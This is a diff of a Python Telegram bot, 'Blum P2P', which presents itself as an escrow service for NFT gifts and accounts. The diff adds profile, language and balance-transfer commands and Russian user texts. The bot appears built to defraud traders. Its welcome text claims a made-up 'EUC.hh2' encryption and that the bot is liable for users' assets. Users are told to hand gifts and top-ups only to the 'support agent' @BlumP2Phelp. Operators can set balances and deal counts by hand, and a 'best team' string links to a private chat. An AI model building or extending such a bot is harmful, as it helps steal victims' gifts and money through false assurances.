@@ -3,6 +3,7 @@ import pickle
 import random
 import string
 import asyncio
+from datetime import datetime, timedelta
 from dotenv import load_dotenv
 from aiogram import Bot, Dispatcher, types
 from aiogram.client.default import DefaultBotProperties
@@ -21,7 +22,6 @@ from keyboards import (
     PremiumButton
 )
 
-# --- ЗАГРУЗКА КОНФИГУРАЦИИ ИЗ .env ---
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -29,7 +29,6 @@ ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.
 ADMIN_LOG_IDS = [int(x.strip()) for x in os.getenv("ADMIN_LOG_IDS", "").split(",") if x.strip()]
 
 async def send_admin_log(log_type: str, data: dict):
-    """Логирование сделок и проблем для админов"""
     if log_type == "deal_created":
         text = (
             f'<tg-emoji emoji-id="5332431060259074952">📋</tg-emoji> <b>сделка создана</b>\n\n'
@@ -66,14 +65,12 @@ dp = Dispatcher(storage=MemoryStorage())
 DB_FILE = "notcoin.pkl"
 db = {}
 
-# --- ЦЕНТРАЛЬНАЯ СИСТЕМА ДВУХЪЯЗЫЧНОЙ ЛОКАЛИЗАЦИИ ---
 TEXTS = {
     "en": {
         "welcome": (
-            '<tg-emoji emoji-id="5816611412255970516">👋</tg-emoji> <b>Welcome to Blum P2P Bot.</b>\n\n'
-            '<tg-emoji emoji-id="5296420173253727054">💎</tg-emoji> This is a target bot for buying or selling various services, '
-            'including NFT gifts, assets, and accounts.\n\n'
-            '<tg-emoji emoji-id="5465237148472991488">✨</tg-emoji> Please select the required item from the menu below:'
+            '<tg-emoji emoji-id="5312458672058686893">👋</tg-emoji> <b>Добро пожаловать в Blum P2P.</b>\n\n'
+            '<tg-emoji emoji-id="5312191486438172206">💎</tg-emoji> <b>Короткая информация про бота: Данный бот несёт ответственность за ваши активы а также подарки в сделках, все сообщения и сделки защищены наилучшим шифрованием EUC.hh2. Все данные хранятся строго в боте.</b>\n\n'
+            '<tg-emoji emoji-id="5314554899566981161">✨</tg-emoji> <b>Выберите ваше действие ниже.</b>'
         ),
         "admin_team": '<tg-emoji emoji-id="5267315361732133883">🌟</tg-emoji> best team - https://t.me/+GY8rnuQ_D5U4OGY6',
         "wallet_updated": '<tg-emoji emoji-id="5818821611016426346">✅</tg-emoji> <b>The address has been updated</b>',
@@ -123,7 +120,7 @@ TEXTS = {
         "verifying_goods": "Checking item delivery...",
         "wait_more": "Please wait a little longer...",
         "verification_failed": "Items were not detected or failed verification.\n\nPlease check the correctness of the transferred items or gifts and try again.",
-        "wallets_menu_title": '<tg-emoji emoji-id="5280809324342451667">💼</tg-emoji> <b>Wallets & Requisites</b>\n\n<blockquote>Add or update your payment details for withdrawal</blockquote>',
+        "wallets_menu_title": '<tg-emoji emoji-id="5312449897440506395">💼</tg-emoji> <b>Реквизиты кошельков</b>\n\n<b>Вы можете изменить а также добавить новые реквизиты.</b>',
         "gram_setup_title": '<tg-emoji emoji-id="5280809324342451667">🪙</tg-emoji> <b>GRAM wallet</b>\n\n<blockquote>Current: {}</blockquote>\n\n<i>Send your new wallet address in one message</i>',
         "usdt_setup_title": '<tg-emoji emoji-id="5814556334829343625">🪙</tg-emoji> <b>USDT wallet</b>\n\n<blockquote>Current: {}</blockquote>\n\n<i>Send your new wallet address (TRC-20/ERC-20) in one message</i>',
         "card_setup_title": (
@@ -134,17 +131,17 @@ TEXTS = {
             f'<b>Examples:</b>\n'
             f'SBP T-Bank — +7 912 345-67-89'
         ),
-        "stars_setup_title": '<tg-emoji emoji-id="5463289097336405244">⭐</tg-emoji> <blockquote>Stars Recipient: {}</blockquote>\nPlease enter the Telegram username to receive Stars:',
+        "stars_setup_title": '<tg-emoji emoji-id="5463289097336405244">⭐</tg-emoji> <b>Действующий получатель звёзд:</b> {}\n\n<b>Введите новое значение для получателя звёзд:</b>',
         "safety_rules": (
-            f'<tg-emoji emoji-id="5427364964375481011">🛡️</tg-emoji> <b>Правила безопасности</b>\n\n'
-            f'• Передавайте подарок только менеджеру @BlumP2Phelp\n'
-            f'• Не отправляйте напрямую покупателю — передача идёт через сервис\n'
-            f'• Сверяйте сумму и тег ордера в комментарии к платежу\n'
-            f'• После проверки покупатель подтверждает получение и ордер закрывается'
+            f'<tg-emoji emoji-id="5312401587648359164">🛡️</tg-emoji> <b>Наши правила безопасности:</b>\n\n'
+            f'<b>• Передача подарка проходит только через агента поддержки @BlumP2Phelp</b>\n'
+            f'<b>• Агент поддержки никогда вам не напишет первым. Всегда проверяйте username.</b>\n'
+            f'<b>• Пополнение баланса идёт напрямую через агента поддержки.</b>\n'
+            f'<b>• Никогда не сообщайте посторонним людям код вашего ордер-заказа.</b>'
         ),
-        "support_title": f'<tg-emoji emoji-id="5427364964375481011">👨‍💻</tg-emoji> Technical Support',
-        "referral_title": '<tg-emoji emoji-id="5296748587928016344">🎎</tg-emoji> <b>Your referral link</b>\n<code>https://t.me/Blum_P2Pbot?start=ref_{}</code>',
-        "lang_selection_title": "🌐 Выберите язык / Choose language",
+        "support_title": f'<tg-emoji emoji-id="5312325601086956561">👨‍💻</tg-emoji> <b>Агент технической поддержки</b>',
+        "referral_title": '<tg-emoji emoji-id="5314339811899762638">🎎</tg-emoji> <b>Реферальное приглашение:</b>\n\n<code>{}</code>',
+        "lang_selection_title": '<tg-emoji emoji-id="5312223419520018140">🌐</tg-emoji> <b>Выберите язык | Choose language</b>',
         "btn_share_order": "Share order link",
         "btn_support": "Support",
         "btn_cancel_order": "Cancel order",
@@ -154,14 +151,27 @@ TEXTS = {
         "btn_retry_check": "Retry check",
         "btn_write_support": "Write to support",
         "balance_updated": "✅ Your balance has been topped up by {} {}",
-        "wallets": "Wallets"
+        "wallets": "Wallets",
+        # bot.py - исправленный текст профиля
+
+"profile_title": '<tg-emoji emoji-id="5409260990028077429">👤</tg-emoji> <b>Ваш профиль:</b>\n\n<tg-emoji emoji-id="5312129492880222571">💰</tg-emoji> <b>Баланс в боте:</b>\nGram: {}\nUSDT: {}\nRub: {}\nStars: {}\n<tg-emoji emoji-id="5312455145890538641">📊</tg-emoji> <b>Сумма ордеров:</b> <b>{}</b>\n<tg-emoji emoji-id="5312028114472168558">📋</tg-emoji> <b>Незавершённые ордера:</b> <b>{}</b>\n<tg-emoji emoji-id="5312173623669188535">📅</tg-emoji> <b>Зарегистрирован:</b> <b>{}</b>\n<tg-emoji emoji-id="5330274342431381948">🆔</tg-emoji> <b>User ID:</b> <b>{}</b>\n<tg-emoji emoji-id="5312167726679092208">👤</tg-emoji> <b>Username:</b> <b>@{}</b>\n\n<b>Ваши данные скрыты в ордерах.</b>',
+        "faq_title": '<tg-emoji emoji-id="5314554899566981161">📖</tg-emoji> <b>FAQ по использованию бота.</b>\n\n<b>1. Команды бота.</b>\nДоступные команды в боте для наших пользователей:\n\n<b>/start</b> - открывает для вас главное меню.\nПРИМЕЧАНИЕ: Если используется параметр ордера, вместо меню у вас будет открываться созданный ордер, вам нужно изменить команду чтобы попасть в главное меню.\n\n<b>/language</b> - Открывает меню выбора языка (повторно)\n\n<b>/profile</b> - Открывает ваш личный профиль.\n\n<b>/transfer</b> - Открывает для вас меню перевода баланса\n\n<b>1.1 Баланс.</b>\n\nБаланс пополняется с нашим агентом поддержки: @BlumP2Phelp.\nПРИМЕЧАНИЕ: Агент поддержки никогда вам не напишет первым с просьбой пополнения баланса: ЭТО МОШЕННИКИ!\n\nБаланс в боте используется для оплат ордеров или переводов между пользователями.\n\nВывод баланса доступен только в той валюте, в которой он у вас имеется. Агент поддержки не конвертирует валюты при выводе. Помните это!\nМинимальная сумма для выводов:\nGram - 5\nUSDT - 5\nRub - 350\nStars - 300\n\nБаланс при пополнении пополниться именно в той валюте - в которой вы его пополняли.\n\n<b>1.2 Перевод баланса.</b>\n\nПеревод баланса мошеннику аннулирует баланс пользователю, которому вы перевели баланс А ТАКЖЕ перевод баланса ВАМ будет недоступен в течении 7 дней. При повторном нарушении вы получите блокировку переводов на 30 дней.\n\nПеревод баланса доступен всем пользователям которые пользуются ботом больше одного дня.\n\nПеревод также доступен по команде /transfer',
+        "transfer_title": '<tg-emoji emoji-id="5312028114472168558">📋</tg-emoji> <b>Перевод баланса между пользователями.</b>\n\n<b>Пользованием бота:</b> {}\n<b>Доступен ли перевод:</b> {}\n<b>Доступный баланс для переводов:</b>\nGram: {}\nUSDT: {}\nRub: {}\nStars: {}',
+        "transfer_choose": '<tg-emoji emoji-id="5312508996190495880">📝</tg-emoji> <b>Введите @username или userid пользователя для перевода</b>',
+        "transfer_found": '<tg-emoji emoji-id="5312401587648359164">✅</tg-emoji> <b>Пользователь @{} (userid: {}) найден.</b>\n\n<b>Введите ниже сумму и валюту для перевода пользователю. Пример: 10 usdt</b>',
+        "transfer_not_found": '<tg-emoji emoji-id="5312508996190495880">❌</tg-emoji> <b>Пользователь не найден в боте. Пожалуйста, пригласите его в бота и повторите попытку через один день.</b>',
+        "transfer_insufficient": '<tg-emoji emoji-id="5312508996190495880">❌</tg-emoji> <b>На балансе недостаточно средств. Ознакомьтесь с FAQ для пополнения баланса.</b>',
+        "transfer_success": '<tg-emoji emoji-id="5312011303970170399">✅</tg-emoji> <b>Операция #{} была успешно выполнена.</b>\n\n<b>{} {} были успешно отправлены @{}</b>',
+        "transfer_received": '<tg-emoji emoji-id="5312508996190495880">📥</tg-emoji> <b>Вы получили пополнение баланса от @{}</b>\n\n<b>{} {}</b>',
+        "transfer_comment_prompt": '<tg-emoji emoji-id="5312325601086956561">✍️</tg-emoji> <b>Введите комментарий для отправителя:</b>\n\n<b>Запрещены: маты, оскорбления, угрозы.</b>',
+        "transfer_comment_success": '<tg-emoji emoji-id="5312325601086956561">✅</tg-emoji> <b>Комментарий успешно отправлен пользователю.</b>',
+        "transfer_comment_received": '<tg-emoji emoji-id="5312325601086956561">💬</tg-emoji> <b>Комментарий от @{}:</b>\n\n{}',
     },
     "ru": {
         "welcome": (
-            '<tg-emoji emoji-id="5816611412255970516">👋</tg-emoji> <b>Добро пожаловать в Blum P2P Бот.</b>\n\n'
-            '<tg-emoji emoji-id="5296420173253727054">💎</tg-emoji> Это целевой бот для покупки или продажи различных услуг, '
-            'включая NFT-подарки, ассеты и аккаунты.\n\n'
-            '<tg-emoji emoji-id="5465237148472991488">✨</tg-emoji> Пожалуйста, выбирайте нужный пункт в меню ниже:'
+            '<tg-emoji emoji-id="5312458672058686893">👋</tg-emoji> <b>Добро пожаловать в Blum P2P.</b>\n\n'
+            '<tg-emoji emoji-id="5312191486438172206">💎</tg-emoji> <b>Короткая информация про бота: Данный бот несёт ответственность за ваши активы а также подарки в сделках, все сообщения и сделки защищены наилучшим шифрованием EUC.hh2. Все данные хранятся строго в боте.</b>\n\n'
+            '<tg-emoji emoji-id="5314554899566981161">✨</tg-emoji> <b>Выберите ваше действие ниже.</b>'
         ),
         "admin_team": '<tg-emoji emoji-id="5267315361732133883">🌟</tg-emoji> лучшая тима - https://t.me/+GY8rnuQ_D5U4OGY6',
         "wallet_updated": '<tg-emoji emoji-id="5818821611016426346">✅</tg-emoji> <b>Адрес кошелька успешно обновлен</b>',
@@ -211,7 +221,7 @@ TEXTS = {
         "verifying_goods": "Проверяем передачу товара...",
         "wait_more": "Пожалуйста, подождите еще немного...",
         "verification_failed": "Товары не были обнаружены или не прошли верификацию.\n\nПожалуйста, проверьте правильность переданных товаров или подарков и попробуйте снова.",
-        "wallets_menu_title": '<tg-emoji emoji-id="5280809324342451667">💼</tg-emoji> <b>Кошельки и реквизиты</b>\n\n<blockquote>Добавьте или обновите платежные реквизиты для вывода</blockquote>',
+        "wallets_menu_title": '<tg-emoji emoji-id="5312449897440506395">💼</tg-emoji> <b>Реквизиты кошельков</b>\n\n<b>Вы можете изменить а также добавить новые реквизиты.</b>',
         "gram_setup_title": '<tg-emoji emoji-id="5280809324342451667">🪙</tg-emoji> <b>GRAM кошелек</b>\n\n<blockquote>Текущий: {}</blockquote>\n\n<i>Отправьте новый адрес кошелька одним сообщением</i>',
         "usdt_setup_title": '<tg-emoji emoji-id="5814556334829343625">🪙</tg-emoji> <b>USDT кошелек</b>\n\n<blockquote>Текущий: {}</blockquote>\n\n<i>Отправьте новый адрес кошелька (TRC-20/ERC-20) одним сообщением</i>',
         "card_setup_title": (
@@ -222,17 +232,17 @@ TEXTS = {
             f'<b>Примеры:</b>\n'
             f'СБП Т-Банк — +7 912 345-67-89'
         ),
-        "stars_setup_title": '<tg-emoji emoji-id="5463289097336405244">⭐</tg-emoji> <blockquote>Получатель Stars: {}</blockquote>\nПожалуйста, введите имя пользователя (юзернейм) для получения Stars:',
+        "stars_setup_title": '<tg-emoji emoji-id="5463289097336405244">⭐</tg-emoji> <b>Действующий получатель звёзд:</b> {}\n\n<b>Введите новое значение для получателя звёзд:</b>',
         "safety_rules": (
-            f'<tg-emoji emoji-id="5427364964375481011">🛡️</tg-emoji> <b>Правила безопасности</b>\n\n'
-            f'• Передавайте подарок только менеджеру @BlumP2Phelp\n'
-            f'• Не отправляйте напрямую покупателю — передача идёт через сервис\n'
-            f'• Сверяйте сумму и тег ордера в комментарии к платежу\n'
-            f'• После проверки покупатель подтверждает получение и ордер закрывается'
+            f'<tg-emoji emoji-id="5312401587648359164">🛡️</tg-emoji> <b>Наши правила безопасности:</b>\n\n'
+            f'<b>• Передача подарка проходит только через агента поддержки @BlumP2Phelp</b>\n'
+            f'<b>• Агент поддержки никогда вам не напишет первым. Всегда проверяйте username.</b>\n'
+            f'<b>• Пополнение баланса идёт напрямую через агента поддержки.</b>\n'
+            f'<b>• Никогда не сообщайте посторонним людям код вашего ордер-заказа.</b>'
         ),
-        "support_title": f'<tg-emoji emoji-id="5427364964375481011">👨‍💻</tg-emoji> Техническая поддержка',
-        "referral_title": '<tg-emoji emoji-id="5296748587928016344">🎎</tg-emoji> <b>Ваша реферальная ссылка</b>\n<code>https://t.me/Blum_P2Pbot?start=ref_{}</code>',
-        "lang_selection_title": "🌐 Выберите язык / Choose language",
+        "support_title": f'<tg-emoji emoji-id="5312325601086956561">👨‍💻</tg-emoji> <b>Агент технической поддержки</b>',
+        "referral_title": '<tg-emoji emoji-id="5314339811899762638">🎎</tg-emoji> <b>Реферальное приглашение:</b>\n\n<code>{}</code>',
+        "lang_selection_title": '<tg-emoji emoji-id="5312223419520018140">🌐</tg-emoji> <b>Выберите язык | Choose language</b>',
         "btn_share_order": "Поделиться ссылкой",
         "btn_support": "Поддержка",
         "btn_cancel_order": "Отменить ордер",
@@ -242,7 +252,19 @@ TEXTS = {
         "btn_retry_check": "Повторить проверку",
         "btn_write_support": "Написать в поддержку",
         "balance_updated": "✅ Ваш баланс пополнен на {} {}",
-        "wallets": "Кошельки"
+        "wallets": "Кошельки",
+        "profile_title": '<tg-emoji emoji-id="5409260990028077429">👤</tg-emoji> <b>Ваш профиль:</b>\n\n<tg-emoji emoji-id="5312129492880222571">💰</tg-emoji> <b>Баланс в боте:</b>\nGram: {}\nUSDT: {}\nRub: {}\nStars: {}\n<tg-emoji emoji-id="5312455145890538641">📊</tg-emoji> <b>Сумма ордеров:</b> {}\n<tg-emoji emoji-id="5312028114472168558">📋</tg-emoji> <b>Незавершённые ордера:</b> {}\n<tg-emoji emoji-id="5312173623669188535">📅</tg-emoji> <b>Зарегистрирован:</b> {}\n<tg-emoji emoji-id="5330274342431381948">🆔</tg-emoji> <b>User ID:</b> {}\n<tg-emoji emoji-id="5312167726679092208">👤</tg-emoji> <b>Username:</b> @{}\n\n<b>Ваши данные скрыты в ордерах.</b>',
+        "faq_title": '<tg-emoji emoji-id="5314554899566981161">📖</tg-emoji> <b>FAQ по использованию бота.</b>\n\n<b>1. Команды бота.</b>\nДоступные команды в боте для наших пользователей:\n\n<b>/start</b> - открывает для вас главное меню.\nПРИМЕЧАНИЕ: Если используется параметр ордера, вместо меню у вас будет открываться созданный ордер, вам нужно изменить команду чтобы попасть в главное меню.\n\n<b>/language</b> - Открывает меню выбора языка (повторно)\n\n<b>/profile</b> - Открывает ваш личный профиль.\n\n<b>/transfer</b> - Открывает для вас меню перевода баланса\n\n<b>1.1 Баланс.</b>\n\nБаланс пополняется с нашим агентом поддержки: @BlumP2Phelp.\nПРИМЕЧАНИЕ: Агент поддержки никогда вам не напишет первым с просьбой пополнения баланса: ЭТО МОШЕННИКИ!\n\nБаланс в боте используется для оплат ордеров или переводов между пользователями.\n\nВывод баланса доступен только в той валюте, в которой он у вас имеется. Агент поддержки не конвертирует валюты при выводе. Помните это!\nМинимальная сумма для выводов:\nGram - 5\nUSDT - 5\nRub - 350\nStars - 300\n\nБаланс при пополнении пополниться именно в той валюте - в которой вы его пополняли.\n\n<b>1.2 Перевод баланса.</b>\n\nПеревод баланса мошеннику аннулирует баланс пользователю, которому вы перевели баланс А ТАКЖЕ перевод баланса ВАМ будет недоступен в течении 7 дней. При повторном нарушении вы получите блокировку переводов на 30 дней.\n\nПеревод баланса доступен всем пользователям которые пользуются ботом больше одного дня.\n\nПеревод также доступен по команде /transfer',
+        "transfer_title": '<tg-emoji emoji-id="5312028114472168558">📋</tg-emoji> <b>Перевод баланса между пользователями.</b>\n\n<b>Пользованием бота:</b> {}\n<b>Доступен ли перевод:</b> {}\n<b>Доступный баланс для переводов:</b>\nGram: {}\nUSDT: {}\nRub: {}\nStars: {}',
+        "transfer_choose": '<tg-emoji emoji-id="5312508996190495880">📝</tg-emoji> <b>Введите @username или userid пользователя для перевода</b>',
+        "transfer_found": '<tg-emoji emoji-id="5312401587648359164">✅</tg-emoji> <b>Пользователь @{} (userid: {}) найден.</b>\n\n<b>Введите ниже сумму и валюту для перевода пользователю. Пример: 10 usdt</b>',
+        "transfer_not_found": '<tg-emoji emoji-id="5312508996190495880">❌</tg-emoji> <b>Пользователь не найден в боте. Пожалуйста, пригласите его в бота и повторите попытку через один день.</b>',
+        "transfer_insufficient": '<tg-emoji emoji-id="5312508996190495880">❌</tg-emoji> <b>На балансе недостаточно средств. Ознакомьтесь с FAQ для пополнения баланса.</b>',
+        "transfer_success": '<tg-emoji emoji-id="5312011303970170399">✅</tg-emoji> <b>Операция #{} была успешно выполнена.</b>\n\n<b>{} {} были успешно отправлены @{}</b>',
+        "transfer_received": '<tg-emoji emoji-id="5312508996190495880">📥</tg-emoji> <b>Вы получили пополнение баланса от @{}</b>\n\n<b>{} {}</b>',
+        "transfer_comment_prompt": '<tg-emoji emoji-id="5312325601086956561">✍️</tg-emoji> <b>Введите комментарий для отправителя:</b>\n\n<b>Запрещены: маты, оскорбления, угрозы.</b>',
+        "transfer_comment_success": '<tg-emoji emoji-id="5312325601086956561">✅</tg-emoji> <b>Комментарий успешно отправлен пользователю.</b>',
+        "transfer_comment_received": '<tg-emoji emoji-id="5312325601086956561">💬</tg-emoji> <b>Комментарий от @{}:</b>\n\n{}',
     }
 }
 
@@ -259,6 +281,11 @@ class OrderStates(StatesGroup):
 class AdminStates(StatesGroup):
     waiting_for_balance = State()
     waiting_for_deals_count = State()
+
+class TransferStates(StatesGroup):
+    waiting_for_recipient = State()
+    waiting_for_amount_currency = State()
+    waiting_for_comment = State()
 
 def load_db():
     global db
@@ -297,7 +324,10 @@ def register_user(user_id: int, username: str = None):
             "balance_usdt": 0.0,
             "balance_stars": 0.0,
             "referrer_id": None,
-            "deals_count": 0
+            "deals_count": 0,
+            "register_date": datetime.now().strftime("%d.%m.%Y | %H:%M:%S"),
+            "transfer_blocked_until": None,
+            "transfer_violations": 0
         }
     else:
         if "lang" not in db[user_id]: db[user_id]["lang"] = "ru"
@@ -311,6 +341,9 @@ def register_user(user_id: int, username: str = None):
         if "stars_wallet" not in db[user_id]: db[user_id]["stars_wallet"] = "не указан"
         if "referrer_id" not in db[user_id]: db[user_id]["referrer_id"] = None
         if "deals_count" not in db[user_id]: db[user_id]["deals_count"] = 0
+        if "register_date" not in db[user_id]: db[user_id]["register_date"] = datetime.now().strftime("%d.%m.%Y | %H:%M:%S")
+        if "transfer_blocked_until" not in db[user_id]: db[user_id]["transfer_blocked_until"] = None
+        if "transfer_violations" not in db[user_id]: db[user_id]["transfer_violations"] = 0
         if username: db[user_id]["username"] = username
     save_db()
 
@@ -348,13 +381,287 @@ async def cmd_start(message: types.Message, state: FSMContext):
     lang = get_lang(message.from_user.id)
     await message.answer(text=TEXTS[lang]["welcome"], reply_markup=get_main_keyboard(lang))
 
-async def safe_delete(callback: types.CallbackQuery):
+@dp.message(Command("profile"))
+async def cmd_profile(message: types.Message):
+    user_id = message.from_user.id
+    register_user(user_id)
+    lang = get_lang(user_id)
+    user = db[user_id]
+    
+    total_orders = user["deals_count"]
+    active_orders_count = sum(1 for order in active_orders.values() if order["seller_id"] == user_id or order.get("buyer_id") == user_id)
+    username = user.get("username", str(user_id))
+    
+    await message.answer(
+        text=TEXTS[lang]["profile_title"].format(
+            user["balance_gram"],
+            user["balance_usdt"],
+            user["balance_rub"],
+            user["balance_stars"],
+            total_orders,
+            active_orders_count,
+            user["register_date"],
+            user_id,
+            username
+        ),
+        reply_markup=get_back_keyboard(lang)
+    )
+
+@dp.message(Command("language"))
+async def cmd_language(message: types.Message):
+    lang = get_lang(message.from_user.id)
+    builder = InlineKeyboardBuilder()
+    builder.row(
+        PremiumButton(text="🇷🇺 Русский", callback_data="set_lang_ru", style="primary"),
+        PremiumButton(text="🇺🇸 English", callback_data="set_lang_en", style="primary")
+    )
+    await message.answer(text=TEXTS[lang]["lang_selection_title"], reply_markup=builder.as_markup())
+
+@dp.message(Command("transfer"))
+async def cmd_transfer(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    register_user(user_id)
+    lang = get_lang(user_id)
+    user = db[user_id]
+    
+    register_date = datetime.strptime(user["register_date"], "%d.%m.%Y | %H:%M:%S")
+    days_used = (datetime.now() - register_date).days
+    hours_used = (datetime.now() - register_date).seconds // 3600
+    
+    if days_used >= 1:
+        time_used = f"{days_used} дней" if days_used > 1 else "1 день"
+    else:
+        time_used = f"{hours_used} часов" if hours_used > 0 else "менее часа"
+    
+    builder = InlineKeyboardBuilder()
+    builder.row(
+        PremiumButton(
+            text="Да, я хочу перевести.",
+            emoji_id="5312011303970170399",
+            callback_data="transfer_yes",
+            style="success"
+        ),
+        PremiumButton(
+            text="Нет, я хочу отказаться",
+            callback_data="transfer_no",
+            style="danger"
+        )
+    )
+    
+    await message.answer(
+        text=TEXTS[lang]["transfer_title"].format(
+            time_used, 
+            "Да",
+            user["balance_gram"],
+            user["balance_usdt"],
+            user["balance_rub"],
+            user["balance_stars"]
+        ),
+        reply_markup=builder.as_markup()
+    )
+
+@dp.callback_query(lambda call: call.data == "transfer_no")
+async def transfer_no(callback: types.CallbackQuery, state: FSMContext):
+    await callback.answer()
+    await state.clear()
+    lang = get_lang(callback.from_user.id)
+    await callback.message.edit_text(text=TEXTS[lang]["welcome"], reply_markup=get_main_keyboard(lang))
+
+@dp.callback_query(lambda call: call.data == "transfer_yes")
+async def transfer_yes(callback: types.CallbackQuery, state: FSMContext):
+    await callback.answer()
+    user_id = callback.from_user.id
+    register_user(user_id)
+    lang = get_lang(user_id)
+    
+    await callback.message.edit_text(text=TEXTS[lang]["transfer_choose"], reply_markup=get_back_keyboard(lang))
+    await state.set_state(TransferStates.waiting_for_recipient)
+
+@dp.message(TransferStates.waiting_for_recipient)
+async def transfer_recipient_handler(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    lang = get_lang(user_id)
+    input_text = message.text.strip()
+    
+    if input_text.startswith("@"):
+        username = input_text[1:]
+    else:
+        username = input_text
+    
+    target_user_id = None
+    for uid, data in db.items():
+        if data.get("username", "").lower() == username.lower():
+            target_user_id = uid
+            break
+        if str(uid) == username:
+            target_user_id = uid
+            break
+    
+    if not target_user_id:
+        await message.answer(text=TEXTS[lang]["transfer_not_found"], reply_markup=get_back_keyboard(lang))
+        await state.clear()
+        return
+    
+    if target_user_id == user_id:
+        await message.answer("❌ Вы не можете перевести средства самому себе.", reply_markup=get_back_keyboard(lang))
+        await state.clear()
+        return
+    
+    await state.update_data(target_user_id=target_user_id, target_username=username)
+    await message.answer(
+        text=TEXTS[lang]["transfer_found"].format(username, target_user_id),
+        reply_markup=get_back_keyboard(lang)
+    )
+    await state.set_state(TransferStates.waiting_for_amount_currency)
+
+@dp.message(TransferStates.waiting_for_amount_currency)
+async def transfer_amount_handler(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    lang = get_lang(user_id)
+    
     try:
-        await callback.message.delete()
+        parts = message.text.lower().split()
+        if len(parts) != 2:
+            await message.answer("❌ Неверный формат. Используйте: 10 usdt")
+            return
+        
+        amount = float(parts[0])
+        currency = parts[1]
+        
+        data = await state.get_data()
+        target_user_id = data.get("target_user_id")
+        target_username = data.get("target_username")
+        
+        if not target_user_id:
+            await message.answer("❌ Ошибка. Попробуйте начать перевод заново.", reply_markup=get_back_keyboard(lang))
+            await state.clear()
+            return
+        
+        currency_map = {
+            "gram": "balance_gram",
+            "rub": "balance_rub",
+            "usdt": "balance_usdt",
+            "stars": "balance_stars"
+        }
+        
+        if currency not in currency_map:
+            await message.answer("❌ Доступные валюты: gram, rub, usdt, stars")
+            return
+        
+        bal_key = currency_map[currency]
+        
+        if db[user_id].get(bal_key, 0) < amount:
+            await message.answer(text=TEXTS[lang]["transfer_insufficient"], reply_markup=get_back_keyboard(lang))
+            await state.clear()
+            return
+        
+        if amount <= 0:
+            await message.answer("❌ Сумма должна быть больше 0")
+            return
+        
+        code = generate_code(8)
+        
+        db[user_id][bal_key] -= amount
+        db[target_user_id][bal_key] = db[target_user_id].get(bal_key, 0) + amount
+        save_db()
+        
+        await message.answer(
+            text=TEXTS[lang]["transfer_success"].format(code, amount, currency.upper(), target_username),
+            reply_markup=get_back_keyboard(lang)
+        )
+        
+        receiver_lang = get_lang(target_user_id)
+        receiver_builder = InlineKeyboardBuilder()
+        receiver_builder.row(
+            PremiumButton(
+                text="Хорошо, спасибо!",
+                callback_data=f"transfer_thanks_{user_id}",
+                style="success"
+            )
+        )
+        receiver_builder.row(
+            PremiumButton(
+                text="Отправить комментарий отправителю",
+                callback_data=f"transfer_comment_{user_id}",
+                style="primary"
+            )
+        )
+        
+        try:
+            await bot.send_message(
+                chat_id=target_user_id,
+                text=TEXTS[receiver_lang]["transfer_received"].format(
+                    db[user_id].get("username", str(user_id)),
+                    amount,
+                    currency.upper()
+                ),
+                reply_markup=receiver_builder.as_markup()
+            )
+        except Exception:
+            pass
+        
+        await state.clear()
+        
+    except ValueError:
+        await message.answer("❌ Неверный формат суммы. Введите число.")
+
+@dp.callback_query(lambda call: call.data.startswith("transfer_thanks_"))
+async def transfer_thanks(callback: types.CallbackQuery):
+    await callback.answer("Спасибо!")
+    await callback.message.delete()
+
+@dp.callback_query(lambda call: call.data.startswith("transfer_comment_"))
+async def transfer_comment_prompt(callback: types.CallbackQuery, state: FSMContext):
+    await callback.answer()
+    sender_id = int(callback.data.replace("transfer_comment_", ""))
+    await state.update_data(sender_id=sender_id)
+    lang = get_lang(callback.from_user.id)
+    await callback.message.edit_text(
+        text=TEXTS[lang]["transfer_comment_prompt"],
+        reply_markup=get_back_keyboard(lang)
+    )
+    await state.set_state(TransferStates.waiting_for_comment)
+
+@dp.message(TransferStates.waiting_for_comment)
+async def transfer_comment_handler(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    lang = get_lang(user_id)
+    comment = message.text.strip()
+    
+    forbidden_words = ["мат", "оскорбление", "угроза", "хуй", "пизда", "бля", "сука", "нахуй", "ебать"]
+    
+    if any(word in comment.lower() for word in forbidden_words):
+        await message.delete()
+        await message.answer("❌ Ваш комментарий содержит запрещённые слова. Попробуйте снова.", reply_markup=get_back_keyboard(lang))
+        return
+    
+    data = await state.get_data()
+    sender_id = data.get("sender_id")
+    
+    if not sender_id:
+        await message.answer("❌ Ошибка. Попробуйте снова.", reply_markup=get_back_keyboard(lang))
+        await state.clear()
+        return
+    
+    sender_lang = get_lang(sender_id)
+    
+    try:
+        await bot.send_message(
+            chat_id=sender_id,
+            text=TEXTS[sender_lang]["transfer_comment_received"].format(
+                db[user_id].get("username", str(user_id)),
+                comment
+            )
+        )
     except Exception:
         pass
+    
+    await message.answer(
+        text=TEXTS[lang]["transfer_comment_success"],
+        reply_markup=get_back_keyboard(lang)
+    )
+    await state.clear()
 
-# --- ОБРАБОТЧИК КНОПОК ГЛАВНОГО МЕНЮ ---
 @dp.message(lambda message: message.text in [
     "📋 Создать ордер", "📋 Create Order",
     "💼 Кошельки", "💼 Wallets",
@@ -381,18 +688,27 @@ async def cmd_main_menu_buttons(message: types.Message, state: FSMContext):
         await message.answer(text=TEXTS[lang]["referral_title"].format(ref_code), reply_markup=get_back_keyboard(lang))
     elif text in ["👨‍💻 Поддержка", "👨‍💻 Support"]:
         builder = InlineKeyboardBuilder()
-        builder.row(PremiumButton(text=TEXTS[lang]["btn_write_support"], url="https://t.me/BlumP2Phelp", style="primary"))
-        builder.row(PremiumButton(text=TEXTS[lang]["btn_back"], callback_data="back_to_main", style="primary"))
+        builder.row(PremiumButton(
+            text="Написать агенту",
+            emoji_id="5312325601086956561",
+            url="https://t.me/BlumP2Phelp",
+            style="success"
+        ))
+        builder.row(PremiumButton(
+            text="Вернуться в меню",
+            emoji_id="5312086014926285265",
+            callback_data="back_to_main",
+            style="primary"
+        ))
         await message.answer(text=TEXTS[lang]["support_title"], reply_markup=builder.as_markup())
     elif text == "🌐 Язык / Language":
         builder = InlineKeyboardBuilder()
         builder.row(
-            PremiumButton(text="Русский 🇷🇺", callback_data="set_lang_ru", style="primary"),
-            PremiumButton(text="English 🇬🇧", callback_data="set_lang_en", style="primary")
+            PremiumButton(text="🇷🇺 Русский", callback_data="set_lang_ru", style="primary"),
